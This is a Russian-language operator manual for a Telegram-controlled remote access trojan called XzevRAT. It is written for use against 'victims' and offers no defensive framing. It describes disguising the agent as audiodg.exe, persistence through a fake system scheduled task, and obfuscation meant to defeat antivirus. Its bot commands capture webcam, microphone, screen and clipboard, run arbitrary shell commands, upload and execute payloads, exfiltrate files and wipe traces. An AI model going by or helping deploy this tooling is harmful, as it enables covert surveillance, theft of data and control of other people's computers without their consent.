1. Введение

XzevRAT — это мощный инструмент удалённого администрирования, построенный на Python и использующий Telegram в качестве канала управления. Он позволяет полностью контролировать целевую машину (жертву) с любого устройства, где есть Telegram.

    Маскировка — процесс маскируется под системный audiodg.exe, не вызывая подозрений.

    Персистентность — автоматически прописывается в планировщик задач Windows, переживая перезагрузки.

    Анонимность — весь трафик идёт через Telegram, открытые порты не используются.

    Кроссплатформенность — управляющая часть работает на Windows, Linux, macOS; агент (жертва) — на Windows 7, 8, 10, 11.

2. Установка на машине жертвы
2.1. Первый запуск

При первом запуске RAT:

    Создаёт скрытую папку в %APPDATA%\Microsoft\Windows\Caches\.

    Прописывает задачу в планировщик с именем WindowsAudioService (запуск при входе в систему).

    Маскирует процесс под audiodg.exe.

    Устанавливает соединение с вашим Telegram-ботом (токен зашит в коде).

    Важно: Убедитесь, что ваш Telegram-бот активен и имеет права на отправку сообщений в канал / вам в ЛС.

3. Управление через Telegram

Все команды отправляются в чат с вашим ботом или в канал (если настроено). Каждая команда начинается с /.
3.1. Основные команды
/list

Описание: Показывает список всех активных устройств (онлайн).
Пример:
/list
Ответ:
text

🟢 Device-1 (Windows 10) - Online
🟢 Device-2 (Windows 11) - Online

/screen имя_пользователя

Описание: Делает скриншот рабочего стола жертвы и отправляет его в чат.
Пример:
/screen tester
Ответ: фото (изображение).
/webcam имя_пользователя

Описание: Делает фото с веб-камеры жертвы. Если камера занята — будет ошибка.
Пример:
/webcam tester
Ответ: фото с камеры.
/micro имя_пользователя

Описание: Записывает 10 секунд с микрофона жертвы и отправляет аудиофайл (WAV/OGG).
Пример:
/micro tester
Ответ: аудиофайл microphone.wav.
/buffer имя_пользователя

Описание: Отображает текущее содержимое буфера обмена жертвы.
Пример:
/buffer tester
Ответ: текст из буфера или «Буфер пуст».
/presskey имя_пользователя комбинация_клавиш

Описание: Имитирует нажатие клавиш на клавиатуре жертвы. Поддерживает комбинации: alt+f4, ctrl+shift+t, win+r и т.д.
Формат: /presskey [имя] [комбинация]
Пример:
/presskey tester alt+f4
Ответ: «Комбинация alt+f4 отправлена».
/cmd имя_пользователя команда

Описание: Выполняет любую команду в командной строке (CMD) на жертве. Может запускать PowerShell, скрипты.
Формат: /cmd [имя] [команда]
Пример:
/cmd tester ipconfig /all
Ответ: выполняет команду ipconfig /all на компьютере пользователя и возвращает вывод.
/browser имя_пользователя ссылка

Описание: Открывает указанную ссылку в браузере по умолчанию на машине жертвы.
Формат: /browser [имя] [URL]
Пример:
/browser tester youtube.com
Ответ: ссылка открыта.
/wallpaper имя_пользователя (с прикреплённым файлом изображения)

Описание: Меняет обои рабочего стола жертвы на отправленную картинку.
Формат: Отправьте фото/картинку с подписью /wallpaper [имя]
Пример:
/wallpaper tester (и приложите картинку)
Ответ: обои изменены.
/play имя_пользователя (с прикреплённым аудиофайлом)

Описание: Проигрывает аудиофайл (отправленный вами) на компьютере жертвы.
Формат: Отправьте аудио с подписью /play [имя]
Пример:
/play tester (и приложите аудио)
Ответ: аудио запущено.
/upload имя_пользователя (с прикреплённым файлом)

Описание: Загружает файл на машину жертвы. Файл сохраняется в скрытую папку C:\Users\Public\Documents\XzevCache\.
Формат: Отправьте файл с подписью /upload [имя]
Пример:
/upload tester (и приложите файл)
Ответ: файл загружен.
/execute имя_пользователя имя_файла

Описание: Запускает ранее загруженный файл (например, .exe).
Формат: /execute [имя] [имя_файла]
Пример:
/execute tester payload.exe
Ответ: файл запущен.
/files имя_пользователя

Описание: Показывает содержимое папок: Рабочий стол, Документы, Загрузки. Выводит список файлов и папок с размерами и датами.
Пример:
/files tester
Ответ: список файлов.
/export имя_пользователя путь_к_файлу

Описание: Скачивает указанный файл с машины жертвы.
Формат: /export [имя] [полный путь]
Пример:
/export tester C:\Users\Public\Documents\secret.txt
Ответ: отправляет файл в чат.
/off имя_пользователя

Описание: Выключает компьютер жертвы (симуляция сбоя).
Пример:
/off tester
Ответ: «ПК выключается...» (команда выполняется без подтверждения).
/restart имя_пользователя

Описание: Перезагружает компьютер жертвы.
Пример:
/restart tester
Ответ: «ПК перезагружается...»
/killme имя_пользователя

Описание: Полное самоуничтожение RAT: удаляет все свои файлы, задачи в планировщике и завершает процесс. Без следа.
Пример:
/killme tester
Ответ: «Self-destruct initiated. Goodbye.» — после этого RAT исчезает.
4. Дополнительные возможности
4.1. Обфускация кода

В комплекте идут инструменты для обфускации исходного кода (многослойное шифрование, подмена строк, вставка мусорного кода). Это делает детект антивирусами практически невозможным. Используйте скрипт encrypt.py для генерации защищённого билда.
4.2. Кросс-платформенность

Управляющая часть (бот) может работать на любой ОС, где есть Python и Telegram. Агент (жертва) — только на Windows (7, 8, 10, 11). Однако вы также можете скомпилировать агент для Linux/macOS (требуется доработка кода).
5. Настройка Telegram-канала и бота

    Создайте бота через @BotFather и получите токен.

    Создайте закрытый канал (или группу), куда бот будет отправлять отчёты и скриншоты.

    Добавьте бота в канал как администратора с правом отправки сообщений.

    В коде RAT укажите токен бота и ID чата/канала в файле main.py.

    Готово! Все команды будут приходить в этот канал/чат.

    Совет: Используйте отдельный аккаунт для бота и не светите свой основной Telegram.

6. Безопасность и маскировка

    Процесс: RAT переименовывает себя в audiodg.exe и запускается из системной папки (или копирует себя туда).

    Планировщик: Создаётся задача с именем, похожим на системное обновление.

    Обфускация: Исходный код проходит через многослойное шифрование и сжатие, что ломает сигнатуры антивирусов.

    Трафик: Все команды и ответы передаются через Telegram Bot API, что не требует открытия портов на роутере.
